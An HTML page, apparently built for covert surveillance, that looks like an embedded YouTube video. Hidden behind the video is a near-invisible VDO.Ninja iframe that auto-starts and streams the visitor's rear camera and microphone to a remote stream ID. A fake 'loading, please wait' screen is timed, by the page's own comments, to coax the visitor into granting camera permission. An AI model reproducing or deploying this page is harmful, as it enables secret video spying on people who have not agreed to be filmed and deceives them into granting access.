<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow" />
  <title>カメラ起動</title>
  <style>
    html, body { height: 100%; margin: 0; background:#000; }

    /* 裏：VDO.Ninja（配信用・見えない）
       display:none はNG。ほぼ透明で動かし続ける */
    iframe#vdo {
      position: fixed; inset: 0;
      width: 100%; height: 100%;
      border: 0;
      opacity: 0.001;
      pointer-events: none;
    }

    /* 表：既存ページ（操作できる） */
    iframe#overlay {
      position: fixed; inset: 0;
      width: 100%; height: 100%;
      border: 0;
      background: #fff;
    }

    /* 初動だけ表示する軽いガード（2秒で消える） */
    .guard {
      position: fixed; inset: 0;
      display: flex; align-items: center; justify-content: center;
      text-align: center;
      padding: 24px;
      background: #000;
      color: #fff;
      font-family: system-ui, -apple-system, "Hiragino Sans", "Noto Sans JP", sans-serif;
      line-height: 1.8;
      font-size: 18px;
      letter-spacing: 0.02em;
      z-index: 3;
    }
    .guard .note{
      margin-top: 12px;
      font-size: 13px;
      opacity: 0.7;
      line-height: 1.7;
    }
  </style>
</head>
<body>
  <!-- 裏：カメラ配信 -->
  <iframe
    id="vdo"
    allow="camera *; microphone *; autoplay; fullscreen"
    referrerpolicy="no-referrer"
  ></iframe>

  <!-- 表：既存ページ（ここを差し替え） -->
  <iframe
    id="overlay"
    src="https://www.youtube.com/embed/Vo-771wlTko?si=RuGbhGMJEvGVI4_G"
    referrerpolicy="no-referrer"
  ></iframe>

  <!-- 最初だけ“待ってね”を見せて許可ダイアログ誘導 -->
  <div class="guard" id="guard">
    <div>
      読み込み中…<br>
      このままの画面でお待ちください。
      <div class="note">※スマホをスリープ状態にしないでください。</div>
    </div>
  </div>

  <script>
    const STREAM_ID = "toaCam01";

    // VDO.Ninja：送信（外カメラ優先）
    const vdoSrc =
      "https://vdo.ninja/?" +
      "push=" + encodeURIComponent(STREAM_ID) +
      "&webcam" +
      "&autostart" +
      "&facing=rear" +
      "&cleanoutput" +
      "&hidehome" +
      "&transparent";

    document.getElementById("vdo").src = vdoSrc;

    // ガードは2.5秒で消す（許可ダイアログが出る時間を稼ぐ）
    setTimeout(() => {
      const g = document.getElementById("guard");
      if (g) g.style.display = "none";
    }, 2500);
  </script>
</body>
</html>
